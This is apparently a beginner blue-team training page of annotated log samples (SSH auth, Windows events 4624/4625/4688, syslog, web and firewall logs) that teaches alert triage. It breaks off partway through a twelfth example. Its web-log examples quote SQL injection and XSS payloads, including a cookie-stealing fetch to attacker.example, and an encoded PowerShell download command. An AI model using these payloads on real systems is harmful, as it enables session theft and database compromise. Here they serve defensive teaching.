---
title: "Beginner"
weight: 10000001
date: 2026-05-21T00:00:00+07:00
draft: false
description: "Blue team beginner examples — log reading, basic alert triage, and foundational SIEM queries (Examples 1–28)"
tags: ["blue-team", "beginner", "by-example"]
---

These 28 examples build foundational blue team skills — reading system logs, recognizing attack
patterns, constructing basic SIEM queries, and performing initial alert triage. Each example
follows the five-part format described in the [overview](../overview.md).

## Example 1: Reading /var/log/auth.log — Failed SSH Logins, Successful Logins, and sudo Usage

**What this covers:** Linux authentication events are written to `/var/log/auth.log` (Debian/Ubuntu)
or `/var/log/secure` (RHEL/CentOS). Reading this file teaches you to distinguish failed login
attempts, successful logins, and privilege escalation events from legitimate operational activity.

**Scenario:** You are a Tier 1 SOC analyst reviewing the authentication log on a Linux bastion host
after an alert fires for repeated failed logins from an external IP address.

```bash
# /var/log/auth.log — annotated sample
# Format: TIMESTAMP HOSTNAME PROCESS[PID]: MESSAGE

May 21 02:14:05 bastion-01 sshd[3812]: Failed password for invalid user admin from 203.0.113.47 port 54231 ssh2
# => Failed login attempt                                  (event type: authentication failure)
# => "invalid user admin" — username does not exist on the host (no such local account)
# => Source IP: 203.0.113.47 (external, RFC 5737 documentation range used here for example)

May 21 02:14:07 bastion-01 sshd[3814]: Failed password for invalid user root from 203.0.113.47 port 54233 ssh2
# => Second failure from the same IP within 2 seconds      (rapid sequential attempt)
# => "root" is another invalid user — direct root SSH typically disabled in sshd_config

May 21 02:14:09 bastion-01 sshd[3816]: Failed password for jsmith from 203.0.113.47 port 54235 ssh2
# => Third failure — now targeting a VALID username "jsmith" (username enumeration likely preceding)
# => Pattern so far: 3 failures from same IP in 4 seconds → brute-force indicator

May 21 08:32:01 bastion-01 sshd[4102]: Accepted publickey for jsmith from 10.x.1.15 port 52100 ssh2
# => Successful SSH login                                   (event type: authentication success)
# => Method: "publickey" — certificate-based auth (preferred; password auth should be disabled)
# => Source IP: 10.x.1.15 (internal network, expected for this user)

May 21 08:32:04 bastion-01 sshd[4102]: pam_unix(sshd:session): session opened for user jsmith by (uid=0)
# => SSH session officially opened for jsmith              (uid=0 here means opened by PAM/root context)
# => Log this timestamp as session start for timeline reconstruction

May 21 08:45:12 bastion-01 sudo: jsmith : TTY=pts/0 ; PWD=/home/jsmith ; USER=root ; COMMAND=/bin/cat /etc/shadow
# => sudo event — jsmith ran a command as root             (event type: privilege escalation)
# => COMMAND=/bin/cat /etc/shadow — reading the shadow password file is HIGH risk
# => Legitimate sysadmins rarely need to cat /etc/shadow; this warrants immediate review
```

**Key Takeaway:** Repeated failures from a single external IP signal brute-force activity; a sudo
event reading `/etc/shadow` immediately after a successful login should be escalated, not closed.

**Why It Matters:** Auth logs are the first artifact a SOC analyst reviews during a Linux intrusion
investigation. Learning to distinguish invalid-user failures from valid-user failures, track session
open/close pairs, and spot unusual sudo commands builds the pattern recognition needed for faster
triage. Many real intrusions begin with SSH brute-force and escalate to credential harvesting via
`/etc/shadow` reads — catching this chain early contains the blast radius.

---

## Example 2: Reading Windows Security Event Log — Event ID 4624 and 4625

**What this covers:** Windows Security Event Log records authentication events using numeric Event
IDs. Event ID 4624 records a successful account logon; Event ID 4625 records a failed logon. Both
contain logon type codes that reveal whether the logon was interactive, network-based, or remote.

**Scenario:** You are reviewing Windows Security logs on a domain workstation after an endpoint
detection alert flagged unusual logon activity during off-hours.

```bash
# Windows Security Event Log — XML fields presented in readable key:value form
# Event ID 4624 — An account was successfully logged on

EventID:        4624
TimeCreated:    2026-05-21T03:17:44Z
Computer:       WKS-ACCT-042.corp.example.com
SubjectUserName: SYSTEM
# => SubjectUserName SYSTEM means the OS itself initiated the logon record (normal for network logons)

TargetUserName:  jdoe
TargetDomainName: CORP
# => The account that actually logged on: CORP\jdoe

LogonType:       3
# => LogonType 3 = Network logon (e.g., accessing a file share, not interactive desktop)
# => LogonType 2 = Interactive; 10 = RemoteInteractive (RDP); 5 = Service

IpAddress:       203.0.113.88
IpPort:          49201
# => Source IP 203.0.113.88 — external IP on a network logon at 03:17 UTC is anomalous
# => Corp users should not be authenticating via network logon from external IPs at 3 AM

AuthenticationPackageName: NTLM
# => NTLM used instead of Kerberos — external/non-domain hosts use NTLM
# => NTLM is weaker; modern environments should prefer Kerberos or block NTLM externally

# ---

# Event ID 4625 — An account failed to log on

EventID:        4625
TimeCreated:    2026-05-21T03:17:40Z
Computer:       WKS-ACCT-042.corp.example.com
TargetUserName:  jdoe
LogonType:       3
FailureReason:   %%2313
# => %%2313 = "Unknown user name or bad password"         (most common failure reason)

SubStatus:       0xC000006A
# => SubStatus 0xC000006A = wrong password (user EXISTS but password is wrong)
# => Compare: 0xC0000064 = user does not exist; 0xC0000234 = account locked out

IpAddress:       203.0.113.88
# => Same external IP as the 4624 above — 4625 at 03:17:40 then 4624 at 03:17:44
# => 4-second gap: one failure then success from same IP = likely credential stuffing hit
```

**Key Takeaway:** A 4625 immediately followed by a 4624 from the same external IP in the same
minute is a credential stuffing success — escalate immediately and disable the account pending
investigation.

**Why It Matters:** Event IDs 4624 and 4625 are among the highest-volume events in any Windows
environment. Analysts who cannot quickly decode logon types, sub-status codes, and source IP
context will drown in noise. Understanding that LogonType 3 from an external IP at 3 AM is
inherently suspicious — even when credentials succeed — separates reactive from proactive detection
and accelerates mean-time-to-respond on identity-based intrusions.

---

## Example 3: Reading Windows Security Event Log — Event ID 4688 (Process Creation)

**What this covers:** Event ID 4688 records every process creation on Windows when the audit policy
is configured for process tracking. It captures the new process name, the parent process, the
command line, and the creator subject — essential data for detecting malicious execution chains.

**Scenario:** You are a Tier 1 analyst reviewing endpoint logs on a finance workstation after an
antivirus alert flagged suspicious PowerShell activity. The AV did not block the process.

```bash
# Windows Security Event Log — Event ID 4688 (Process Creation)
# Audit Policy required: Audit Process Creation = Success

EventID:             4688
TimeCreated:         2026-05-21T14:22:07Z
Computer:            WKS-FIN-017.corp.example.com

SubjectUserName:     bwilson
SubjectDomainName:   CORP
# => bwilson is the logged-on user whose session spawned the new process

NewProcessName:      C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
# => PowerShell launched — not inherently malicious, but context matters

ParentProcessName:   C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE
# => Parent is Microsoft Word — Word spawning PowerShell is a CRITICAL red flag
# => Legitimate Word macros do not need to invoke PowerShell in most environments
# => This pattern matches macro-based malware (e.g., Emotet, Qakbot initial access)

CommandLine:         powershell.exe -NoProfile -NonInteractive -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgAGgAdAB0AHAAOgAvAC8AMQAwADMALgA=
# => -EncodedCommand flag: base64-encoded payload, a common obfuscation technique
# => -NoProfile -NonInteractive: suppress user profile and interaction (stealth indicators)
# => The base64 blob decodes to: Invoke-WebRequest -Uri http://103. (truncated — download attempt)

TokenElevationType:  %%1936
# => %%1936 = TokenElevationTypeLimited (not elevated/admin)
# => Process ran without admin rights — attacker may seek UAC bypass next

ProcessId:           0x1A3C
NewProcessId:        0x2B80
# => Record both PIDs for correlation with subsequent 4688 events (child process chain)
```

**Key Takeaway:** Word (or Excel) spawning PowerShell with an encoded command is one of the
highest-fidelity macro-malware indicators available in Windows event logs — treat it as confirmed
compromise until proven otherwise.

**Why It Matters:** Event ID 4688 with command-line logging enabled is the cornerstone of Windows
endpoint detection. The parent-child process relationship exposes execution chains that endpoint
protection often misses when individual binaries appear legitimate. Analysts who can read 4688
events and spot Office-spawning-shell patterns can detect most phishing-delivered malware before
the attacker achieves persistence.

---

## Example 4: Reading /var/log/syslog — Kernel Messages, Service Starts/Stops, and Cron Jobs

**What this covers:** `/var/log/syslog` (Debian/Ubuntu) aggregates messages from the kernel, system
services, and the cron daemon. Reading it teaches analysts to distinguish normal operational events
from suspicious service manipulations, unexpected reboots, or unauthorized scheduled task additions.

**Scenario:** You are reviewing syslog on a Linux web server after an alert indicates a new cron
job was added by a non-root account outside a maintenance window.

```bash
# /var/log/syslog — annotated sample
# Format: TIMESTAMP HOSTNAME FACILITY[PID]: MESSAGE

May 21 09:00:01 web-prod-03 CRON[7741]: (root) CMD (/usr/bin/certbot renew --quiet)
# => Routine cron job run as root                          (legitimate scheduled task)
# => certbot renew is expected on web servers using Let's Encrypt certificates

May 21 09:15:03 web-prod-03 systemd[1]: Starting nginx.service - A high performance web server...
May 21 09:15:03 web-prod-03 systemd[1]: Started nginx.service - A high performance web server.
# => Normal service start for nginx                        (expected after maintenance)
# => systemd[1] means PID 1 (init) managed the service lifecycle

May 21 11:42:17 web-prod-03 kernel: [1234567.890] EXT4-fs error (device sda1): ext4_validate_block_bitmap:376
# => Kernel filesystem error                               (hardware or disk issue)
# => EXT4-fs errors in production warrant disk health check (smartctl -a /dev/sda)
# => Not a security event — but disk corruption can be used to cover attacker tracks

May 21 14:03:55 web-prod-03 CRON[9102]: (www-data) CMD (/tmp/.update_check.sh)
# => Cron job running as www-data (the web server process user) — SUSPICIOUS
# => Script path is /tmp/ — attackers commonly stage payloads in /tmp (world-writable)
# => ".update_check.sh" uses a dot prefix to hide in directory listings (ls without -a)
# => www-data running scripts from /tmp during business hours is a HIGH-priority finding

May 21 14:03:55 web-prod-03 CRON[9102]: (CRON) error (can't fork)
# => The cron job failed to fork (system resource exhaustion or permission issue)
# => Even a failed execution warrants investigation — crontab entry itself is evidence

May 21 23:58:12 web-prod-03 systemd[1]: Stopping nginx.service...
May 21 23:58:12 web-prod-03 systemd[1]: Stopped nginx.service.
# => nginx stopped at 23:58 — outside any known maintenance window
# => Cross-reference with auth.log: who was logged in at this time?
```

**Key Takeaway:** A cron job running a script from `/tmp` as a service account outside normal
maintenance windows is a reliable indicator of persistence established by a web shell or supply
chain compromise.

**Why It Matters:** Syslog is frequently overlooked in favor of auth.log, but it captures the full
operational story of a Linux host — service restarts triggered by malicious configuration changes,
kernel panics after rootkit loading, and cron-based persistence all appear here first. Analysts
fluent in syslog baseline behavior detect attacker persistence mechanisms that auth.log alone
cannot surface.

---

## Example 5: Reading Apache/nginx Access Log — HTTP Method, Status Code, and User-Agent Fields

**What this covers:** Web server access logs record every HTTP request with the client IP, HTTP
method, requested path, response status code, response size, and user-agent string. These five
fields together allow analysts to identify scanning, exploitation attempts, and data exfiltration
patterns.

**Scenario:** You are reviewing Apache access logs on a public-facing e-commerce server during a
routine shift review.

```bash
# Apache Combined Log Format — annotated
# FORMAT: IP - USER [TIMESTAMP] "METHOD PATH HTTP/VER" STATUS SIZE "REFERER" "USER-AGENT"

203.0.113.5 - - [21/May/2026:10:14:01 +0700] "GET /index.php HTTP/1.1" 200 12453 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
# => Normal GET request for homepage                      (status 200 = success)
# => Size 12453 bytes is within expected range for this page
# => User-agent looks like a real browser (Windows 10 / Chrome)

203.0.113.5 - - [21/May/2026:10:14:03 +0700] "POST /checkout HTTP/1.1" 302 0 "https://shop.example.com/cart" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
# => POST to /checkout then redirect (302)                 (typical purchase flow)
# => Referer is same-origin (shop.example.com) — consistent with normal navigation

198.51.100.22 - - [21/May/2026:10:22:17 +0700] "GET /wp-admin/admin-ajax.php HTTP/1.1" 404 196 "-" "python-requests/2.28.0"
# => 404 — resource not found (this server likely doesn't run WordPress)
# => User-agent "python-requests" is a script/tool, not a browser — automated scanning
# => Requesting wp-admin paths on a non-WordPress site = CMS fingerprint scanning

198.51.100.22 - - [21/May/2026:10:22:18 +0700] "GET /administrator/index.php HTTP/1.1" 404 196 "-" "python-requests/2.28.0"
# => Joomla admin path probed immediately after WordPress attempt
# => Same IP, same user-agent, 1-second interval — automated CMS scanner (e.g., wpscan, droopescan)

198.51.100.22 - - [21/May/2026:10:22:19 +0700] "GET /.env HTTP/1.1" 403 196 "-" "python-requests/2.28.0"
# => Attempting to read .env file (environment variables — DB passwords, API keys)
# => Status 403 = server refused (good — .env is protected), but the attempt must be logged
# => Three requests in 2 seconds from same script: clear reconnaissance pattern
```

**Key Takeaway:** A non-browser user-agent requesting CMS admin paths and sensitive files like
`.env` across multiple endpoints within seconds is an automated scanner — block the IP at the WAF
and review whether any requests received status 200.

**Why It Matters:** Web access logs are the most common first-response artifact in application
security incidents. The combination of user-agent string, status code sequence, and request timing
distinguishes human browsing from automated scanning better than any single field alone. Analysts
who read access logs fluently can spot reconnaissance before exploitation and reduce dwell time.

---

## Example 6: Reading Apache/nginx Error Log — 404 Patterns, 500 Errors, and Upstream Failures

**What this covers:** Web server error logs capture events that access logs underrepresent:
application exceptions, upstream proxy failures, file permission errors, and repeated 404
responses that precede exploitation. These logs reveal server-side failures attackers trigger
during testing.

**Scenario:** You are investigating a report from the development team that the application began
returning 500 errors intermittently during a period when no deployment occurred.

```bash
# nginx error log — annotated
# Format: YYYY/MM/DD HH:MM:SS [LEVEL] PID#TID: *CONNID MESSAGE

2026/05/21 10:55:03 [error] 1821#1821: *4412 open() "/var/www/html/wp-login.php" failed (2: No such file or directory), client: 198.51.100.22, server: shop.example.com, request: "GET /wp-login.php HTTP/1.1"
# => 404-class error: requested file does not exist on disk
# => Client 198.51.100.22 requesting wp-login.php — WordPress login page probe
# => This server runs a custom app (no WordPress) — scanner looking for known CMS paths

2026/05/21 10:55:04 [error] 1821#1821: *4413 open() "/var/www/html/.git/config" failed (2: No such file or directory), client: 198.51.100.22, server: shop.example.com, request: "GET /.git/config HTTP/1.1"
# => Attempting to read .git/config — exposed Git repos leak source code and credentials
# => Good: the file does not exist (or is properly blocked)
# => If this returned 200: immediate critical finding — source code exposure

2026/05/21 11:30:17 [error] 1821#1821: *5001 connect() failed (111: Connection refused) while connecting to upstream, upstream: "http://127.0.0.1:8080/api/orders", client: 10.x.2.5
# => Upstream connection refused — the backend application server is not responding
# => Upstream is 127.0.0.1:8080 (local app server, e.g., Node.js or Gunicorn)
# => Could be: legitimate app crash, OOM kill, or attacker stopped/replaced the service

2026/05/21 11:30:17 [warn]  1821#1821: *5001 upstream server temporarily disabled while connecting to upstream, upstream: "http://127.0.0.1:8080"
# => nginx marks the upstream as temporarily disabled after connection failure
# => This causes all users to receive 502/503 errors — service impact has begun
# => Cross-reference: check syslog for app process exit or systemd service stop at ~11:30

2026/05/21 11:31:02 [error] 1821#1821: *5088 recv() failed (104: Connection reset by peer) while reading response header from upstream
# => The upstream connected but then reset the connection mid-response
# => Pattern: app crash after receiving a specific request (possibly triggered by exploit attempt)
# => Correlate with access log at 11:30:17 — what request immediately preceded the crash?
```

**Key Takeaway:** Repeated error-log file-not-found entries from a single IP scanning known
sensitive paths confirm automated reconnaissance; upstream connection failures immediately
following a specific request pattern indicate a potential server-side exploitation attempt.

**Why It Matters:** Error logs close the gap between what access logs record (requests) and what
actually happened on the server (failures). Exploitation attempts frequently manifest as 500 errors
or upstream crashes because the attacker is testing payloads that trigger exceptions. Correlating
error log timestamps with access log request sequences is a core skill for web intrusion
investigation.

---

## Example 7: Identifying a Brute-Force Attack in auth.log — Many Failures from the Same IP

**What this covers:** A brute-force SSH attack generates a high volume of Event ID 4625 equivalents
in auth.log — specifically "Failed password" lines — from a single source IP over a short time
window. Recognizing the volumetric pattern, the targeted usernames, and the eventual success (if
any) are the three key detection skills this example builds.

**Scenario:** You are a Tier 1 SOC analyst reviewing an alert triggered by a threshold rule: more
than 10 failed SSH logins from a single IP in 60 seconds.

```bash
# auth.log — brute-force attack sample (condensed to show pattern)
# 47 failures from 203.0.113.99 between 04:11:00 and 04:11:47 (< 1 failure/second)

May 21 04:11:00 db-prod-01 sshd[6612]: Failed password for invalid user oracle from 203.0.113.99 port 41000 ssh2
# => Invalid user "oracle" — common DB service account name, targeted by automated tools

May 21 04:11:01 db-prod-01 sshd[6614]: Failed password for invalid user postgres from 203.0.113.99 port 41002 ssh2
# => "postgres" — default PostgreSQL superuser; another common brute-force target

May 21 04:11:02 db-prod-01 sshd[6616]: Failed password for root from 203.0.113.99 port 41004 ssh2
# => root targeted — most Linux servers disable root SSH, making this a wasted attempt

May 21 04:11:03 db-prod-01 sshd[6618]: Failed password for admin from 203.0.113.99 port 41006 ssh2
# => "admin" — generic admin account probe, common in IoT/embedded attack toolkits

May 21 04:11:30 db-prod-01 sshd[6720]: Failed password for dbadmin from 203.0.113.99 port 41060 ssh2
# => "dbadmin" — environment-specific guess, suggests attacker has some intel about this host
# => Transition from generic to specific usernames may indicate prior reconnaissance

May 21 04:11:46 db-prod-01 sshd[6748]: Failed password for deploy from 203.0.113.99 port 41088 ssh2
# => "deploy" — CI/CD service account; if it exists and uses password auth, high risk

May 21 04:11:48 db-prod-01 sshd[6750]: Accepted password for deploy from 203.0.113.99 port 41090 ssh2
# => SUCCESS — attacker guessed the password for "deploy" account
# => "Accepted password" (not publickey) — password authentication was enabled, a misconfiguration
# => Immediate actions: disable the account, rotate credentials, isolate the host
```

**Key Takeaway:** The progression from generic to environment-specific usernames followed by a
successful login confirms the attacker had some prior knowledge — investigate how the username
`deploy` was discovered (LinkedIn, GitHub, previous breach) before containing the incident.

**Why It Matters:** SSH brute-force is one of the most common initial access vectors against
Internet-exposed Linux hosts. Most attacks use credential lists from prior data breaches rather
than truly random guessing. The moment a "Accepted password" line appears after a brute-force
sequence, the incident shifts from attempted to confirmed intrusion. SOC analysts must know this
threshold and have a runbook ready to execute containment within minutes.

---

## Example 8: Identifying a Port Scan in Firewall Logs — Sequential Port Connection Attempts

**What this covers:** A port scan generates a series of connection attempts to different ports on
the same destination IP within a short time window. Firewall logs record these as individual
dropped or rejected packets. Recognizing the sequential port pattern, short time intervals, and
single source IP distinguishes scanning from normal Internet traffic.

**Scenario:** You are reviewing firewall deny logs after a threat intelligence feed flagged the
source IP 203.0.113.150 as a known scanner.

```bash
# Firewall deny log — iptables/netfilter format on a Linux gateway
# Format: TIMESTAMP HOSTNAME kernel: [UPTIME] TAG IN=IF OUT=IF SRC=IP DST=IP LEN PROTO SPT DPT

May 21 07:00:01 fw-gw-01 kernel: [88201.445] DENY IN=eth0 SRC=203.0.113.150 DST=10.x.1.10 PROTO=TCP SPT=54100 DPT=22
# => Destination port 22 (SSH) — first probe in the scan sequence
# => SRC port 54100 changes with each packet; DST port increments sequentially below

May 21 07:00:01 fw-gw-01 kernel: [88201.447] DENY IN=eth0 SRC=203.0.113.150 DST=10.x.1.10 PROTO=TCP SPT=54101 DPT=23
# => Port 23 (Telnet) — 2ms after port 22, sequential port increment

May 21 07:00:01 fw-gw-01 kernel: [88201.449] DENY IN=eth0 SRC=203.0.113.150 DST=10.x.1.10 PROTO=TCP SPT=54102 DPT=25
# => Port 25 (SMTP) — continues the sequential sweep
# => Timing: 22→23→25 within 4ms — machine speed, not human browsing

May 21 07:00:02 fw-gw-01 kernel: [88202.103] DENY IN=eth0 SRC=203.0.113.150 DST=10.x.1.10 PROTO=TCP SPT=54180 DPT=80
# => Port 80 (HTTP) — web server probe
# => Still same source IP, destination IP — single host scan in progress

May 21 07:00:02 fw-gw-01 kernel: [88202.104] DENY IN=eth0 SRC=203.0.113.150 DST=10.x.1.10 PROTO=TCP SPT=54181 DPT=443
# => Port 443 (HTTPS) — TLS web probe immediately after HTTP

May 21 07:00:02 fw-gw-01 kernel: [88202.210] DENY IN=eth0 SRC=203.0.113.150 DST=10.x.1.10 PROTO=TCP SPT=54200 DPT=3306
# => Port 3306 (MySQL) — database port probe
# => Sequential scan covering SSH, Telnet, SMTP, HTTP, HTTPS, MySQL in under 2 seconds

May 21 07:00:03 fw-gw-01 kernel: [88203.001] DENY IN=eth0 SRC=203.0.113.150 DST=10.x.1.10 PROTO=TCP SPT=54250 DPT=5432
# => Port 5432 (PostgreSQL) — attacker is building a service map of the target host
# => 65+ ports probed in 2 seconds → textbook TCP SYN scan (nmap -sS behavior)
```

**Key Takeaway:** Sequential destination ports across a single target IP within milliseconds is the
defining signature of an automated port scanner — block the source IP, check whether any port
returned an ACK (accepted connection), and investigate those services first.

**Why It Matters:** Port scans are reconnaissance events that immediately precede exploitation.
Firewall logs showing a scan that received no ACKs mean the attacker mapped the attack surface
but has not yet engaged a service. This is the ideal detection window — blocking the scanner
and hardening exposed services before the attacker returns with targeted exploits can prevent
the intrusion entirely.

---

## Example 9: Identifying Directory Brute-Force in Web Logs — 404 Flood from a Single IP

**What this covers:** Directory brute-forcing (using tools like `gobuster`, `dirbuster`, or
`feroxbuster`) generates a high volume of 404 responses as the tool requests a wordlist of paths.
The pattern — single IP, many 404s in rapid succession, non-browser user-agent — is highly
distinctive in web access logs.

**Scenario:** You are reviewing nginx access logs on an API server after an alert fires for
sustained 404 response volume above baseline.

```bash
# nginx access log — directory brute-force sample (50 requests in ~5 seconds)
# FORMAT: IP - - [TIMESTAMP] "METHOD PATH" STATUS SIZE "-" "USER-AGENT"

198.51.100.77 - - [21/May/2026:13:01:00 +0700] "GET /admin HTTP/1.1" 404 162 "-" "gobuster/3.6.0"
# => 404 for /admin — does not exist; gobuster user-agent in plain sight
# => gobuster is an open-source directory brute-force tool; its presence = active enumeration

198.51.100.77 - - [21/May/2026:13:01:00 +0700] "GET /backup HTTP/1.1" 404 162 "-" "gobuster/3.6.0"
# => /backup probed — common target for exposed database dumps or config backups

198.51.100.77 - - [21/May/2026:13:01:01 +0700] "GET /api HTTP/1.1" 200 1842 "-" "gobuster/3.6.0"
# => STATUS 200 — /api EXISTS and responded successfully  (finding for the attacker)
# => Gobuster will record this hit and the analyst must note it as an exposed endpoint

198.51.100.77 - - [21/May/2026:13:01:01 +0700] "GET /config HTTP/1.1" 403 162 "-" "gobuster/3.6.0"
# => 403 Forbidden — /config exists but is access-controlled
# => 403 tells the attacker the directory is real; they may try auth bypass next

198.51.100.77 - - [21/May/2026:13:01:02 +0700] "GET /uploads HTTP/1.1" 200 512 "-" "gobuster/3.6.0"
# => /uploads returned 200 — another confirmed endpoint
# => If /uploads allows unauthenticated file upload, this is a critical finding

198.51.100.77 - - [21/May/2026:13:01:03 +0700] "GET /.git HTTP/1.1" 403 162 "-" "gobuster/3.6.0"
# => /.git is protected (403) — good, but its existence is confirmed to the attacker
# => Exposed .git directories are a top-10 web vulnerability; verify .git is truly blocked

198.51.100.77 - - [21/May/2026:13:01:04 +0700] "GET /phpinfo.php HTTP/1.1" 404 162 "-" "gobuster/3.6.0"
# => phpinfo.php probe — common in PHP-targeted scans; 404 here is fine
# => If 200: phpinfo exposes server configuration, PHP version, and environment variables
```

**Key Takeaway:** Extract all paths that returned 200 or 403 during the scan — those are confirmed
endpoints the attacker will target next; audit each for authentication, authorization, and file
upload vulnerabilities immediately.

**Why It Matters:** Directory brute-forcing is how attackers discover hidden API endpoints,
forgotten admin panels, exposed configuration files, and debug interfaces. The scan itself causes
minimal damage, but the subsequent targeted exploitation of discovered paths does. Analysts who can
quickly pivot from "gobuster scan detected" to "here are the three endpoints it found" accelerate
the defensive response by hours.

---

## Example 10: Identifying SQL Injection Attempt in Web Logs — URL-Encoded Payloads in GET Params

**What this covers:** SQL injection attempts in GET requests appear as URL-encoded SQL syntax
in query parameters. Characters like `'` (`%27`), `--` (`%2D%2D`), and keywords like `UNION`,
`SELECT`, and `OR 1=1` in URL parameters are reliable indicators of SQLi testing.

**Scenario:** You are reviewing web application firewall (WAF) bypass logs and access logs after
a developer reports unusual data returned from a product search endpoint.

```bash
# nginx access log — SQL injection attempt via GET parameter
# URL-decoded for readability; raw log contains %27 for ' and %20 for space

198.51.100.44 - - [21/May/2026:15:30:01 +0700] "GET /products?id=1' HTTP/1.1" 500 342 "-" "Mozilla/5.0"
# => Trailing single quote ' after numeric id=1               (classic SQLi probe)
# => Status 500: application threw an error — database error exposed through HTTP response
# => Single quote probe returned 500 = confirmed SQL injection vulnerability

198.51.100.44 - - [21/May/2026:15:30:05 +0700] "GET /products?id=1 OR 1=1-- HTTP/1.1" 200 45821 "-" "Mozilla/5.0"
# => "OR 1=1--" makes the WHERE clause always true            (returns all rows)
# => Status 200 with size 45821 bytes vs. normal ~800 bytes = massive data dump returned
# => "-- " comment-terminates the rest of the SQL query to prevent syntax errors

198.51.100.44 - - [21/May/2026:15:30:12 +0700] "GET /products?id=1 UNION SELECT null,username,password,null FROM users-- HTTP/1.1" 200 2341 "-" "Mozilla/5.0"
# => UNION-based injection: appends a second SELECT to dump the users table
# => "username,password" columns targeted — credential extraction attempt
# => If the response body contains actual password hashes, data breach has occurred

198.51.100.44 - - [21/May/2026:15:30:20 +0700] "GET /products?id=1; DROP TABLE products-- HTTP/1.1" 403 162 "-" "Mozilla/5.0"
# => Stacked query attempting to DROP TABLE (destructive)
# => Status 403: WAF or application blocked this specific payload (good)
# => Prior UNION SELECT returned 200 — WAF blocked DROP but missed data extraction payloads

198.51.100.44 - - [21/May/2026:15:30:25 +0700] "GET /products?id=1 AND SLEEP(5)-- HTTP/1.1" 200 812 "-" "Mozilla/5.0"
# => Time-based blind injection probe: if response delayed by 5s, injection succeeded
# => SLEEP(5) is MySQL-specific; pg_sleep(5) for PostgreSQL, WAITFOR DELAY for SQL Server
# => Attacker is confirming DB type and verifying out-of-band exploitation paths
```

**Key Takeaway:** The `OR 1=1` request returning 45 KB versus the baseline 800 bytes is
definitive proof of data exfiltration via SQL injection — immediately take the endpoint offline,
preserve logs, and assess which data the query returned.

**Why It Matters:** SQL injection remains a top OWASP vulnerability category because it combines
high prevalence with catastrophic impact — full database compromise from a single unparameterized
query. Analysts who can read URL-encoded payloads and correlate response-size spikes with injection
keywords can confirm active exploitation in real time and trigger data breach response procedures
before the attacker finishes exfiltrating.

---

## Example 11: Identifying XSS Attempt in Web Logs — Script Tags in Query Parameters

**What this covers:** Cross-site scripting (XSS) attempts appear in web logs as `<script>` tags,
JavaScript event handlers (`onerror=`, `onload=`), or JavaScript URIs (`javascript:`) in query
parameters or form fields. Reflected XSS attempts are visible directly in access logs; stored XSS
requires checking application database logs as well.

**Scenario:** You are reviewing access logs after a user reports that clicking a search link from
an external forum caused unexpected behavior in their browser.

```bash
# nginx access log — XSS attempt in search parameter
# URL-decoded below; raw log has %3C for < and %3E for > and %22 for "

198.51.100.90 - - [21/May/2026:16:00:01 +0700] "GET /search?q=<script>alert(1)</script> HTTP/1.1" 200 3421 "-" "Mozilla/5.0"
# => Classic reflected XSS probe: <script>alert(1)</script> in query parameter
# => Status 200 with non-trivial size — page rendered; if not sanitized, script executed in victim's browser
# => alert(1) is a proof-of-concept payload; if this works, attacker replaces it with cookie stealer

198.51.100.90 - - [21/May/2026:16:00:04 +0700] "GET /search?q=<img src=x onerror=alert(document.cookie)> HTTP/1.1" 200 3421 "-" "Mozilla/5.0"
# => Image tag with onerror event handler — fires JavaScript when the broken image fails to load
# => document.cookie dumps session cookies — attacker stealing session tokens (session hijacking)
# => This payload bypasses basic <script> tag filters that check for the word "script"

198.51.100.90 - - [21/May/2026:16:00:08 +0700] "GET /search?q=<svg onload=fetch('https://attacker.example/c?c='+document.cookie)> HTTP/1.1" 200 3421 "-" "Mozilla/5.0"
# => SVG tag with onload handler — more modern bypass technique
# => fetch() sends document.cookie to attacker-controlled domain (attacker.example)
# => If this rendered in a victim's browser, cookies were already exfiltrated
# => Check DNS/proxy logs for outbound requests to attacker.example from user IPs

198.51.100.90 - - [21/May/2026:16:00:15 +0700] "GET /profile/update?bio=<script src=//cdn.attacker.example/s.js></script> HTTP/1.1" 200 512 "-" "Mozilla/5.0"
# => Stored XSS attempt: injecting a remote script into a profile bio field
# => If stored (not sanitized before saving), every user who views this profile loads s.js
# => Stored XSS is more dangerous than reflected — affects all viewers, not just click victims
```

**Key Takeaway:** Any `<script>`, `onerror=`, `onload=`, or `fetch()` appearing in URL parameters
that receive a 200 response requires immediate testing of whether the application reflects or
stores the input unsanitized — if it does, treat active session compromise as possible.

**Why It Matters:** XSS is particularly dangerous in authenticated contexts because successful
exploitation allows attackers to hijack administrative sessions or perform actions on behalf of
privileged users. Analysts who spot XSS payloads in access logs and immediately check proxy or
DNS logs for outbound connections to attacker-controlled domains can determine whether sessions
were already stolen before the vulnerability is patched.

---

## Example 12: Recognizing Anomalous User Agent Strings — curl, sqlmap, and nikto in Access Logs

**What this covers:** Automated security and exploitation tools embed distinctive strings in their
HTTP User-Agent headers. Recognizing `curl`, `sqlmap`, `nikto`, `masscan`, and similar tool
signatures in access logs identifies automated scanning or exploitation activity that a human
browser would not generate.

**Scenario:** You are running a weekly access log review and flagging all non-browser user agents
for further investigation.

```bash
# nginx access log — anomalous user agent samples
# FORMAT: IP "REQUEST" STATUS SIZE "USER-AGENT"

198.51.100.11 "GET /login HTTP/1.1" 200 4521 "curl/7.88.1"
# => curl is a command-line HTTP client — legitimate for API testing but also used by attackers
# => /login accessed with curl: could be automated login attempt or API testing
# => Context matters: curl from an internal developer IP is fine; from external IP at 3 AM is not

198.51.100.22 "GET /products?id=1 HTTP/1.1" 200 812 "sqlmap/1.7.8#stable (https://sqlmap.org)"
# => sqlmap identifies itself explicitly in its user-agent — automated SQL injection tool
# => Any sqlmap user-agent in production logs = active SQL injection attack in progress
# => Immediate action: block IP, check if any injection succeeded (status 200 with large response)

198.51.100.33 "GET / HTTP/1.1" 200 12453 "Nikto/2.1.6"
# => Nikto is a web vulnerability scanner — comprehensive probe of known CVEs and misconfigs
# => Nikto explicitly declares itself; blocking it is trivial once detected
# => Follow-up: review all 198.51.100.33 requests to see what Nikto found

198.51.100.44 "GET /cgi-bin/test HTTP/1.1" 404 162 "masscan/1.3"
# => masscan is a high-speed port/service scanner
# => Appearing in web logs means it's probing HTTP specifically (unusual for masscan)
# => Sequential requests to /cgi-bin/ paths: looking for legacy CGI vulnerabilities

198.51.100.55 "GET /robots.txt HTTP/1.1" 200 312 "python-requests/2.31.0"
